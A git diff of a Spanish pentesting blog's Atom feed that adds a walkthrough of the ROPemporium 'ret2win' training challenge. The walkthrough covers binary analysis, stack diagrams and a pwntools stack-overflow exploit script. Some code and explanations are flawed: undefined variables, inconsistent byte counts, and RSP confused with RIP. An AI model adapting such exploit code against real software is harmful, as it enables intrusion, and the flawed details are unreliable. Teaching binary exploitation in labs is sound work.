@@ -1,4 +1,294 @@
-<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" ><generator uri="https://jekyllrb.com/" version="3.9.0">Jekyll</generator><link href="http://localhost:4000/feed.xml" rel="self" type="application/atom+xml" /><link href="http://localhost:4000/" rel="alternate" type="text/html" /><updated>2022-12-24T17:37:55-06:00</updated><id>http://localhost:4000/feed.xml</id><title type="html">c4rta</title><subtitle>Posts sobre pentesting y otras cosas</subtitle><author><name>c4rta</name></author><entry><title type="html">Introduccion a la explotacion binaria</title><link href="http://localhost:4000/introduccion-pwn/" rel="alternate" type="text/html" title="Introduccion a la explotacion binaria" /><published>2022-12-21T00:00:00-06:00</published><updated>2022-12-21T00:00:00-06:00</updated><id>http://localhost:4000/introduccion-pwn</id><content type="html" xml:base="http://localhost:4000/introduccion-pwn/">&lt;p&gt;Creo que debi de hacer este post antes de los demas pero pues se me olvido jiji, asi que ahora te voy a dar una pequeña introduccion sobre algunos temas que considero, son relevantes para iniciar en la explotacion binaria, o mas que nada antes de explotar tu primer buffer overflow stack based, lo que voy abordar es lo siguiente:&lt;/p&gt;
+<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" ><generator uri="https://jekyllrb.com/" version="3.9.0">Jekyll</generator><link href="http://localhost:4000/feed.xml" rel="self" type="application/atom+xml" /><link href="http://localhost:4000/" rel="alternate" type="text/html" /><updated>2023-01-03T22:15:02-06:00</updated><id>http://localhost:4000/feed.xml</id><title type="html">c4rta</title><subtitle>Posts sobre pentesting y otras cosas</subtitle><author><name>c4rta</name></author><entry><title type="html">ROPemporium ret2win - saltando a una funcion con ROP</title><link href="http://localhost:4000/rop-empurium-ret2win/" rel="alternate" type="text/html" title="ROPemporium ret2win - saltando a una funcion con ROP" /><published>2023-01-03T00:00:00-06:00</published><updated>2023-01-03T00:00:00-06:00</updated><id>http://localhost:4000/rop-empurium-ret2win</id><content type="html" xml:base="http://localhost:4000/rop-empurium-ret2win/">&lt;p&gt;Este es el primer desafio de la pagina ROPemporium, dedicada a la explotacion binaria y mas que nada al uso de la tecnica llamada ROP (Return Oriented Programming)&lt;/p&gt;
+
+&lt;h2 id=&quot;analisis-del-binario&quot;&gt;Analisis del binario&lt;/h2&gt;
+
+&lt;p&gt;Primeramente podemos empezar a sacar informacion del binario, ya sea con &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;checksec&lt;/code&gt; (pwntools) o &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;rabin2&lt;/code&gt; (radare2), el resultado que no da rabin2 es:&lt;/p&gt;
+
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;arch     x86
+baddr    0x400000
+binsz    6739
+bintype  elf
+bits     64
+canary   false
+class    ELF64
+compiler GCC: (Ubuntu 7.5.0-3ubuntu1~18.04) 7.5.0
+crypto   false
+endian   little
+havecode true
+intrp    /lib64/ld-linux-x86-64.so.2
+laddr    0x0
+lang     c
+linenum  true
+lsyms    true
+machine  AMD x86-64 architecture
+maxopsz  16
+minopsz  1
+nx       true
+os       linux
+pcalign  0
+pic      false
+relocs   true
+relro    partial
+rpath    NONE
+sanitiz  false
+static   false
+stripped false
+subsys   linux
+va       true
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;p&gt;Es un binario de 64 bits, no tiene PIE, canary, pero tiene NX, asi que no podemos ejecutar codigo en el stack&lt;/p&gt;
+
+&lt;hr /&gt;
+
+&lt;p&gt;Ahora pasaramos a hacer reversing de nuestro binario, puede usar la herramienta que sea, yo usare IDA y gdb con pwndbg, y me ire directamente a la funcion &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;main&lt;/code&gt;&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/images/ret2win/ida1.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Lo unico interesante aqui es que se esta llamando a la funcion &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;pwnme&lt;/code&gt; asi que vamos para alla&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/images/ret2win/ida2.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Por lo que parece, la funcion &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;main&lt;/code&gt; llama a &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;pwnme&lt;/code&gt; y ahi es donde se recibe una entrada del usuario.&lt;/p&gt;
+
+&lt;p&gt;Lo primero interesante que vemos es que se esta creando un buffer de &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;20h&lt;/code&gt; o 32 bytes y que se almacena en &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;s&lt;/code&gt;&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/images/ret2win/ida3.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Como indica la instruccion &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;s               = byte ptr -20h&lt;/code&gt; y &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;lea     rax, [rbp+s]&lt;/code&gt;.&lt;/p&gt;
+
+&lt;p&gt;Mas abajo podemos ver la parte en la que se recibe el input al usuario:&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/images/ret2win/ida4.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Podemos ver que &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;rax&lt;/code&gt; se a asignado en &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;rbp-s&lt;/code&gt; y &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;s&lt;/code&gt; como mencione, contiene el buffer de 32 bytes, ademas se hace un &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;call&lt;/code&gt; a la funcion &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;_read&lt;/code&gt; que recibe el input del usuario el cual son 38 bytes como lo indica la intruccion &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;mov     edx, 38h&lt;/code&gt;.&lt;/p&gt;
+
+&lt;p&gt;Asi que nuestro programa esta permitiendo &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;0x30h - 0x20h&lt;/code&gt; para ocasionar un buffer overflow&lt;/p&gt;
+
+&lt;p&gt;Estas cifras pasandolas a decimal quedarian:&lt;/p&gt;
+
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;0x20h = 32
+0x38h = 56
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;h2 id=&quot;ret2win&quot;&gt;ret2win&lt;/h2&gt;
+
+&lt;p&gt;Aqui es donde empezamos a ver ROP, y como mencione en el titulo vamos a “saltar a una funcion” y esa funcion se llama &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ret2win&lt;/code&gt;, pero… Como vimos, esa funcion nunca se llama en el programa, para encontrarla, en caso de que estes usando radare2 simplemente ingresa el comando &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;alf&lt;/code&gt; y podras ver todas las funciones que hay en el programa, en mi caso como use IDA, me sale en un apartado a la izquierda. Veamos el codigo de la funcion:&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/images/ret2win/ida5.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Aqui lo unico interesante que hace es hacer un cat a la flag, y bueno, es posible saltar a una funcion ya que casi todas terminan con la intruccion &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ret&lt;/code&gt; y esto nos permite crear cadenas ROP (no las usaremos en este ejercicio)&lt;/p&gt;
+
+&lt;h2 id=&quot;contruyendo-el-payload&quot;&gt;Contruyendo el payload&lt;/h2&gt;
+
+&lt;p&gt;En mi caso usare pwndbg, asi que metere el programa y con &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;cyclic 100&lt;/code&gt; generare una secuencia de 100 caracteres que le pasare como input, una vez que el programa pete.&lt;/p&gt;
+
+&lt;h3 id=&quot;llenado-el-buffer&quot;&gt;Llenado el buffer&lt;/h3&gt;
+
+&lt;p&gt;Sabemos que nuestro buffer es que 32 bytes ya cuando hicimos el analisis estaba como &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;rbp-20h&lt;/code&gt; y eso es 32, asi que empezamos a craftear nuestro explot que de momento va asi:&lt;/p&gt;
+
+&lt;div class=&quot;language-py highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;kn&quot;&gt;from&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;pwn&lt;/span&gt; &lt;span class=&quot;kn&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;
+
+&lt;span class=&quot;n&quot;&gt;proc&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;process&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;./ret2win&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+
+&lt;span class=&quot;nb&quot;&gt;buffer&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;sa&quot;&gt;b&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;A&quot;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;32&lt;/span&gt;
+
+&lt;span class=&quot;n&quot;&gt;proc&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;sendline&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;payload&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+&lt;span class=&quot;k&quot;&gt;print&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;proc&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;recvall&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;().&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;decode&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;())&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;h3 id=&quot;sacando-el-offset-de-rbp&quot;&gt;Sacando el offset de RBP&lt;/h3&gt;
+
+&lt;p&gt;Esto simplemente es padding para llegar al RSP o al RIP, y como estamos en un binario de 64 bits, entonces esto seran 8 bytes y nuestro payload queda asi:&lt;/p&gt;
+
+&lt;div class=&quot;language-py highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;kn&quot;&gt;from&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;pwn&lt;/span&gt; &lt;span class=&quot;kn&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;
+
+&lt;span class=&quot;n&quot;&gt;proc&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;process&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;./ret2win&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+
+&lt;span class=&quot;nb&quot;&gt;buffer&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;sa&quot;&gt;b&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;A&quot;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;32&lt;/span&gt;
+&lt;span class=&quot;n&quot;&gt;rbp&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;sa&quot;&gt;b&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;B&quot;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;8&lt;/span&gt;
+
+&lt;span class=&quot;n&quot;&gt;proc&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;sendline&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;payload&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+&lt;span class=&quot;k&quot;&gt;print&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;proc&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;recvall&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;().&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;decode&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;())&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;h3 id=&quot;sacando-el-offset-del-rsp&quot;&gt;Sacando el offset del RSP&lt;/h3&gt;
+
+&lt;p&gt;Ojo, en este ejercicio no sobreescribimos el RIP para que apunte a una direccion que le indiquemos.
+Vamos a sobreescribir el RSP con la direccion de ret2win, y la pregunta es… ¿Por que?, pues la clave de la programacion orientada al retorno (ROP) es la intruccion &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ret&lt;/code&gt;, asi que te explicare como funciona ret, imagina que tenemos este codigo:&lt;/p&gt;
+
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;func:
+  0x01 intruccion
+  .
+  .
+  .
+  ret
+main:
+  0x02 intruccion
+  .
+  .
+  0x03 call func
+  0x04 intruccion
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Tenemos que en el main se hace un llamado a la funcion &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;func&lt;/code&gt; la cual tiene un ret y una vez que se termine de ejecutar la funcion &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;func&lt;/code&gt; hay mas intrucciones, veamos como funciona.&lt;/p&gt;
+
+&lt;p&gt;Imaginemos que el &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;RIP&lt;/code&gt; apunta a la direccion &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;0x02&lt;/code&gt;&lt;/p&gt;
+
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;func:
+  0x01 intruccion
+  .
+  .
+  .
+  ret
+main:
+  0x02 intruccion --&amp;gt; RIP
+  .
+  .
+  0x03 call func
+  0x04 intruccion
+
+
+stack:
+
+ESP --&amp;gt;|         | H
+       |         |
+       |         |
+       |         |
+       |         |
+       |         |
+       |         |
+       |         | L
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;p&gt;Cuando el RIP apunte a la direccion &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;0x03&lt;/code&gt;, es decir cuando se llama a &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;func&lt;/code&gt;, va a hacer push de la siguiente intruccion es decir la que esta en la direccion &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;0x04&lt;/code&gt;y el layout queda asi:&lt;/p&gt;
+
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;func:
+  0x01 intruccion
+  .
+  .
+  .
+  ret
+main:
+  0x02 intruccion
+  .
+  .
+  0x03 call func --&amp;gt; RIP
+  0x04 intruccion 
+
+
+stack:
+
+ESP --&amp;gt;|  0x04   | H
+       |         |
+       |         |
+       |         |
+       |         |
+       |         |
+       |         |
+       |         | L
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Ahora el RIP apunta de la direccion de la funcion y el layout queda asi&lt;/p&gt;
+
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;func:
+  0x01 intruccion --&amp;gt; RIP
+  .
+  .
+  .
+  ret
+main:
+  0x02 intruccion
+  .
+  .
+  0x03 call func 
+  0x04 intruccion 
+
+
+stack:
+
+ESP --&amp;gt;|  0x04   | H
+       |         |
+       |         |
+       |         |
+       |         |
+       |         |
+       |         |
+       |         | L
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Una que vez que ejecuten todas las intrucciones de la funcion, va a ejecutar &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ret&lt;/code&gt;, y lo que va a pasar es que va a hacer &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;pop&lt;/code&gt; de lo que este en el top del stack, osea a lo que este apuntando &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;RSP&lt;/code&gt; y lo va a meter en el &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;RIP&lt;/code&gt;, el layout queda asi:&lt;/p&gt;
+
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;func:
+  0x01 intruccion 
+  .
+  .
+  .
+  ret 
+main:
+  0x02 intruccion
+  .
+  .
+  0x03 call func 
+  0x04 intruccion --&amp;gt; RIP
+
+
+stack:
+
+ESP --&amp;gt;|         | H
+       |         |
+       |         |
+       |         |
+       |         |
+       |         |
+       |         |
+       |         | L
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;p&gt;Como vemos, el RIP tomo el valor que estaba en el RSP y es por eso que ahora el RIP apunta a 0x04.
+Asi es como funciona ret&lt;/p&gt;
+
+&lt;h3 id=&quot;esto-pa-que-nos-sirve&quot;&gt;Esto pa que nos sirve&lt;/h3&gt;
+
+&lt;p&gt;Pues es muy facil, resumidamente seria algo como:&lt;/p&gt;
+
+&lt;p&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ret&lt;/code&gt; hace &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;pop&lt;/code&gt; de lo que este en el &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;RSP&lt;/code&gt; y lo mete en el &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;RIP&lt;/code&gt;, nosotros sobreescribiremos el &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;RSP&lt;/code&gt; con la direccion de la funcion &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ret2win&lt;/code&gt;, entonces cuando &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ret&lt;/code&gt; y &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;RIP&lt;/code&gt; se ejecuten, va a ejecutar la funcion &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ret2win&lt;/code&gt; y mostrara la flag, ya que el &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;RIP&lt;/code&gt; contiene la siguiente intruccion a ejecutar&lt;/p&gt;
+
+&lt;p&gt;Es por eso por lo que necesitamos la intruccion ret en el exploit, antes de sobreescribir el RSP.&lt;/p&gt;
+
+&lt;p&gt;Ahora ya podemos sacar el offset el RSP, como al programa le pasos lo que nos dio &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;cyclic 100&lt;/code&gt;, entonces en el RSP debio de salir algo como esto:&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/images/ret2win/gdb.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Vemos como en el RSP tiene el valor de &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;faaaaaaa&lt;/code&gt; asi que ahora con el comando &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;cyclic -l faaaaaaa&lt;/code&gt; podemos saber el offset del RSP, y nos dio 40&lt;/p&gt;
+
+&lt;h3 id=&quot;direccion-de-ret-y-ret2win&quot;&gt;Direccion de ret y ret2win&lt;/h3&gt;
+
+&lt;p&gt;Para sacar la direccion de &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ret2win&lt;/code&gt; simplemente ponemos &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;p ret2win&lt;/code&gt; y nos arroja:&lt;/p&gt;
+
+&lt;p&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;$1 = {&amp;lt;text variable, no debug info&amp;gt;} 0x400756 &amp;lt;ret2win&amp;gt;&lt;/code&gt;&lt;/p&gt;
+
+&lt;p&gt;Y para la direccion de &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ret&lt;/code&gt; podemos usar la que nos indica el programa, o sacar un gadget con herramientas como &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Ropper&lt;/code&gt;, pero me da flojera y usare la del programa que es &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;0x400755&lt;/code&gt;, y lo podemos ver en el pwndbg:&lt;/p&gt;
+
+&lt;p&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;► 0x400755 &amp;lt;pwnme+109&amp;gt;    ret    &amp;lt;0x6161616161616166&amp;gt;&lt;/code&gt;&lt;/p&gt;
+
+&lt;p&gt;Con todo esto nuestro exploit queda asi:&lt;/p&gt;
+
+&lt;div class=&quot;language-py highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;kn&quot;&gt;from&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;pwn&lt;/span&gt; &lt;span class=&quot;kn&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;
+
+&lt;span class=&quot;n&quot;&gt;proc&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;process&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;./ret2win&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+
+&lt;span class=&quot;nb&quot;&gt;buffer&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;sa&quot;&gt;b&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;A&quot;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;32&lt;/span&gt;
+&lt;span class=&quot;n&quot;&gt;rbp&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;sa&quot;&gt;b&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;B&quot;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;8&lt;/span&gt;
+&lt;span class=&quot;n&quot;&gt;ret&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;p64&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0x400755&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+&lt;span class=&quot;n&quot;&gt;rsp&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;p64&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0x400756&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;#direccion de ret2win
+&lt;/span&gt;
+&lt;span class=&quot;n&quot;&gt;payload&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;buffer&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;rbp&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;ret&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;ret2win&lt;/span&gt;
+
+&lt;span class=&quot;n&quot;&gt;proc&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;sendline&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;payload&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+&lt;span class=&quot;k&quot;&gt;print&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;proc&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;recvall&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;().&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;decode&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;())&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Entonces lo ejecutamos y nos da la flag&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/images/ret2win/pwn.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;</content><author><name>c4rta</name></author><category term="Explotacion binaria" /><category term="ROPemporium" /><category term="rop" /><category term="bof" /><summary type="html">Resolucion del ejercicio ret2win usando ROP</summary></entry><entry><title type="html">Introduccion a la explotacion binaria</title><link href="http://localhost:4000/introduccion-pwn/" rel="alternate" type="text/html" title="Introduccion a la explotacion binaria" /><published>2022-12-21T00:00:00-06:00</published><updated>2022-12-21T00:00:00-06:00</updated><id>http://localhost:4000/introduccion-pwn</id><content type="html" xml:base="http://localhost:4000/introduccion-pwn/">&lt;p&gt;Creo que debi de hacer este post antes de los demas pero pues se me olvido jiji, asi que ahora te voy a dar una pequeña introduccion sobre algunos temas que considero, son relevantes para iniciar en la explotacion binaria, o mas que nada antes de explotar tu primer buffer overflow stack based, lo que voy abordar es lo siguiente:&lt;/p&gt;
 
 &lt;ol&gt;
   &lt;li&gt;Estructura de un binario ELF
@@ -1965,303 +2255,4 @@ Asi que para no hacer esto mas largo, al final la flag que me salio a mi es esta
 
 &lt;p&gt;&lt;img src=&quot;/assets/images/picoCTF-hurry/waifu.jpg&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
 
-&lt;font size=&quot;1&quot;&gt; ijaesuperramadre Kamiya esta bien guapa&lt;/font&gt;</content><author><name>c4rta</name></author><category term="Reversing" /><category term="radare2" /><summary type="html">Resolveremos un pequeño ejercicio de reversing de picoCTF</summary></entry><entry><title type="html">ret2libc bypass NX</title><link href="http://localhost:4000/ret2libc/" rel="alternate" type="text/html" title="ret2libc bypass NX" /><published>2022-07-29T00:00:00-05:00</published><updated>2022-07-29T00:00:00-05:00</updated><id>http://localhost:4000/ret2libc</id><content type="html" xml:base="http://localhost:4000/ret2libc/">&lt;h2 id=&quot;contenido&quot;&gt;Contenido&lt;/h2&gt;
-&lt;ul&gt;
-  &lt;li&gt;¿Que es ret2libc?.&lt;/li&gt;
-  &lt;li&gt;¿Que es No Executable (NX)?.&lt;/li&gt;
-  &lt;li&gt;Un poco de Return Oriented Programming (ROP).&lt;/li&gt;
-  &lt;li&gt;Analizando nuestro binario.&lt;/li&gt;
-  &lt;li&gt;Explicando el payload que usaremos.&lt;/li&gt;
-  &lt;li&gt;Desbordando el buffer y calculando el offset del RIP.&lt;/li&gt;
-  &lt;li&gt;Consiguiendo la direccion de libc.&lt;/li&gt;
-  &lt;li&gt;Consiguiendo los offset de ret, pop rdi ret, /bin/sh y system().&lt;/li&gt;
-  &lt;li&gt;Creando nuestro exploit y ejecutandolo.&lt;/li&gt;
-&lt;/ul&gt;
-
-&lt;h2 id=&quot;que-es-ret2libc&quot;&gt;¿Que es ret2libc?&lt;/h2&gt;
-
